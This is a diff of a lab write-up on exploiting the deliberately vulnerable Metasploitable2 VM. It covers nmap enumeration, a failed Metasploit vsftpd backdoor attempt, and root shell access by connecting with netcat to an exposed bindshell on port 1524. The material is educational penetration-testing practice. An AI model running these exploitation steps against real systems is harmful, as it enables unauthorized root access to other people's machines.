@@ -1,11 +1,11 @@
 <div align="center">
 
-# 🧠 Metasploitable2  
-## Enumeration & Root Exploitation via Exposed Bindshell
+# 💥 Metasploitable2 Exploitation  
+## Enumeration → Vulnerability Discovery → Root Access
 
-![Category](https://img.shields.io/badge/Category-Network%20Exploitation-red?style=for-the-badge)
-![Focus](https://img.shields.io/badge/Focus-Service%20Enumeration-blue?style=for-the-badge)
-![Method](https://img.shields.io/badge/Method-Manual%20Exploitation-success?style=for-the-badge)
+![Category](https://img.shields.io/badge/Category-Exploitation-red?style=for-the-badge)
+![Focus](https://img.shields.io/badge/Focus-Enumeration%20%26%20Access-orange?style=for-the-badge)
+![Tool](https://img.shields.io/badge/Tool-Nmap%20%7C%20Netcat%20%7C%20Metasploit-blue?style=for-the-badge)
 
 </div>
 
@@ -13,246 +13,186 @@
 
 ### 🎯 Objective
 
-Perform enumeration on a vulnerable Linux system, identify exposed services, and determine a viable path to gain root-level access.
-
-The target contained multiple known weaknesses, requiring analysis to determine which attack path was the most effective.
-
-The goal was to simulate a realistic penetration testing workflow by scanning the system, evaluating attack options, and exploiting the simplest working path.
-
-This challenge focused on **service enumeration, exploit validation, and manual exploitation techniques**.
+Enumerate a vulnerable target (Metasploitable2), identify exposed services, and gain root access through exploitation.
 
 ---
 
-### 🖥 Environment
+### 🔍 Step 1 — Network Discovery
 
-| Tool | Purpose |
-|-----|------|
-| Kali Linux | Attacker machine |
-| Metasploitable2 | Vulnerable target |
-| Nmap | Service enumeration |
-| Metasploit | Exploit research and validation |
-| Netcat | Manual exploitation |
+Confirmed connectivity:
+
+```bash
+ping 192.168.74.129
+```
 
 ---
 
-### 📦 Step 1 — Perform Initial Enumeration
+### 🔎 Step 2 — Nmap Enumeration
 
-The target system was scanned to identify open ports and running services.
+```bash
+nmap -sC -sV 192.168.74.129
+```
 
-`nmap -sC -sV 192.168.74.129`
+📸 **Scan Start**
 
-The results revealed a broad attack surface, including FTP, SMB, Telnet, Apache, Tomcat, and a bindshell service on port 1524.
+<img src="../images/Screenshot_2026-03-19_20_13_51.png" width="600">
 
-Among the most important findings were:
+📸 **Scan Results**
 
-- `21/tcp` — vsftpd 2.3.4  
-- `22/tcp` — SSH  
-- `23/tcp` — Telnet  
-- `80/tcp` — Apache  
-- `445/tcp` — Samba  
-- `1524/tcp` — Bindshell  
-- `3306/tcp` — MySQL  
-- `8180/tcp` — Tomcat  
+<img src="../images/Screenshot_2026-03-19_20_14_42.png" width="600">
+<img src="../images/Screenshot_2026-03-19_20_14_53.png" width="600">
+<img src="../images/Screenshot_2026-03-19_20_15_01.png" width="600">
 
 ---
 
-### 🔍 Step 2 — Evaluate Attack Paths
+### 🔑 Key Findings
 
-The enumeration results suggested several possible ways forward.
-
-The FTP service running vsftpd 2.3.4 appeared attractive because it is widely associated with a known backdoor vulnerability.
-
-At the same time, port `1524` stood out because it exposed a bindshell, which may provide direct command execution without authentication.
-
-This created two potential attack paths:
-
-- attempt the known vsftpd route first  
-- pivot to the bindshell if a direct shell was available  
-
----
-
-### 🧪 Step 3 — Launch Metasploit and Investigate the FTP Path
-
-Metasploit was opened to test the vsftpd 2.3.4 exploit path.
-
-📸 **Metasploit Console Started**
-
-<img src="../images/Screenshot 2026-03-19 201834.png" width="700">
-
-The vsftpd module was identified and configured against the target.
-
-📸 **vsftpd Module Selected**
-
-<img src="../images/Screenshot 2026-03-19 202118.png" width="700">
-
-However, the attempt ran into payload validation issues involving `LHOST`.
+| Port | Service | Notes |
+|-----|--------|------|
+| 21 | vsftpd 2.3.4 | Backdoor vulnerability |
+| 22 | SSH | Open |
+| 23 | Telnet | Insecure |
+| 80 | Apache | Web server |
+| 445 | Samba | Vulnerable |
+| 1524 | Bindshell | 🚨 Root access |
+| 8180 | Tomcat | Web app |
 
 ---
 
-#### 🔎 Analytical Observation
+### 🧪 Step 3 — Metasploit Exploration
 
-This was an important reminder that not every known exploit path will work cleanly in practice.
+```bash
+msfconsole
+```
 
-Even when a service version looks promising, tooling, payload selection, or service behavior can complicate the process.
+📸 **Metasploit Startup**
 
-Attackers need to validate findings and adapt their approach when the initial path is not reliable.
+<img src="../images/Screenshot_2026-03-19_20_18_11.png" width="600">
 
----
+Searched for vsftpd modules:
 
-### 🔄 Step 4 — Attempt to Correct the vsftpd Exploit Path
+```bash
+search vsftpd
+```
 
-Additional Metasploit adjustments were attempted to resolve the payload issue.
+📸 **Module Discovery**
 
-📸 **Payload Adjustment Attempt**
-
-<img src="../images/Screenshot 2026-03-19 202309.png" width="700">
-
-A follow-up attempt still resulted in the framework defaulting back to an `LHOST`-dependent payload.
-
-📸 **Metasploit Still Requiring LHOST**
-
-<img src="../images/Screenshot 2026-03-19 202350.png" width="700">
-
-At this point, the FTP route was proving less efficient than expected.
+<img src="../images/Screenshot_2026-03-19_20_18_58.png" width="600">
 
 ---
 
-### 🧪 Step 5 — Test the vsftpd Backdoor Manually
+### ⚠️ Step 4 — Exploit Attempt (vsftpd)
 
-Rather than continue forcing Metasploit, the suspected backdoor port was tested directly.
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.74.129
+run
+```
 
-`nc 192.168.74.129 6200`
+📸 **Exploit Attempt**
 
-📸 **Backdoor Connection Refused**
+<img src="../images/Screenshot_2026-03-19_20_19_38.png" width="600">
+<img src="../images/Screenshot_2026-03-19_20_20_50.png" width="600">
+<img src="../images/Screenshot_2026-03-19_20_21_03.png" width="600">
 
-<img src="../images/Screenshot 2026-03-19 202641.png" width="700">
-
-The connection was refused, confirming that this path was not viable in the current scenario.
-
----
-
-#### 🔎 Analytical Observation
-
-This reinforced an important lesson in exploitation work:
-
-Not all discovered vulnerabilities are practically exploitable, and not all promising paths are worth pursuing once they stop being efficient.
-
-A good workflow depends on pivoting quickly when a better route is available.
+Result: ❌ Failed / unreliable
 
 ---
 
-### 🔄 Step 6 — Pivot to the Bindshell
+### 🎯 Step 5 — Manual Exploitation (Bindshell)
 
-With the FTP path ruled out, focus shifted to the bindshell exposed on port `1524`.
+Attempted connection to port 6200:
 
-Because a bindshell listens for incoming connections, it can provide direct command execution if exposed and reachable.
+```bash
+nc 192.168.74.129 6200
+```
 
-This made it the most straightforward attack path available.
+Result:
 
----
+```
+Connection refused
+```
 
-### 💥 Step 7 — Exploit the Bindshell
+📸 **Failed Attempt**
 
-A direct connection was established with Netcat.
-
-`nc 192.168.74.129 1524`
-
-📸 **Shell Access via Port 1524**
-
-<img src="../images/Screenshot 2026-03-19 202800.png" width="700">
-
-A shell was obtained immediately after connecting.
+<img src="../images/Screenshot_2026-03-19_20_26_42.png" width="600">
 
 ---
 
-### 🔐 Step 8 — Confirm Privilege Level
+### 🚨 Step 6 — Successful Exploitation (Port 1524)
 
-To verify the level of access, the following command was executed:
+```bash
+nc 192.168.74.129 1524
+```
 
-`whoami`
+Result:
 
-📸 **Privilege Confirmation**
+```
+root@metasploitable:/#
+```
 
-<img src="../images/Screenshot 2026-03-19 202821.png" width="700">
+📸 **Root Shell Access**
+
+<img src="../images/Screenshot_2026-03-19_20_27_52.png" width="600">
+
+---
+
+### 🔍 Step 7 — Verification
+
+```bash
+whoami
+```
 
 Output:
 
-`root`
-
-This confirmed full system compromise and demonstrated that the bindshell provided unauthenticated root-level access.
-
----
-
-## 🧠 Methodology Framework Applied
-
 ```
-Enumeration
-      ↓
-Service analysis
-      ↓
-Exploit path selection
-      ↓
-Metasploit validation
-      ↓
-Manual exploit testing
-      ↓
-Attack path pivot
-      ↓
-Bindshell exploitation
-      ↓
-Privilege verification
+root
 ```
 
 ---
 
-## 🛠 Techniques Used
+### 🧠 Analysis
 
-Primary techniques used:
-
-- network enumeration  
-- service analysis  
-- exploit validation  
-- manual shell access  
-- attack path prioritization  
-
-Key concept investigated:
-
-```
-Service-based exploitation and attack path prioritization
-```
+- Port 1524 exposed a **preconfigured bindshell**
+- No authentication required  
+- Immediate root access granted  
+- Represents a **critical backdoor vulnerability**
 
 ---
 
-## 🛡 Defensive Insight
+### 🔐 Security Insight
 
-Exposed services without authentication controls represent critical vulnerabilities.
+This demonstrates:
 
-The bindshell on port `1524` provided direct root-level access and demonstrated how a simple misconfiguration can lead to total compromise.
-
-To reduce this type of risk, organizations should:
-
-- disable unnecessary services  
-- restrict exposed ports  
-- enforce authentication controls  
-- implement segmentation and monitoring  
-- continuously review external and internal attack surfaces  
+- Importance of **full port enumeration**
+- Risks of **default insecure configurations**
+- Why **segmentation and monitoring** are essential
 
 ---
 
-## 💡 Skills Reinforced
+### 🛠 Techniques Used
 
-- network enumeration and analysis  
-- exploit troubleshooting  
-- manual validation of attack paths  
-- adaptive exploitation strategy  
-- privilege verification  
+- network scanning (Nmap)  
+- service enumeration  
+- Metasploit module analysis  
+- manual exploitation (Netcat)  
+
+---
+
+### 🚀 Key Takeaways
+
+- Identified multiple vulnerable services  
+- Tested automated exploitation (Metasploit)  
+- Successfully pivoted to manual exploitation  
+- Achieved root access via bindshell  
+- Reinforced real-world enumeration workflow  
 
 ---
 
 <div align="center">
 
-🔍 Enumeration reveals the attack surface  
-💥 Simpler paths often lead to compromise  
-🔐 Security depends on reducing exposed services  
+🔍 Enumeration reveals attack surface  
+⚠️ Not all exploits succeed  
+💥 Manual exploitation often wins  
 
 </div>
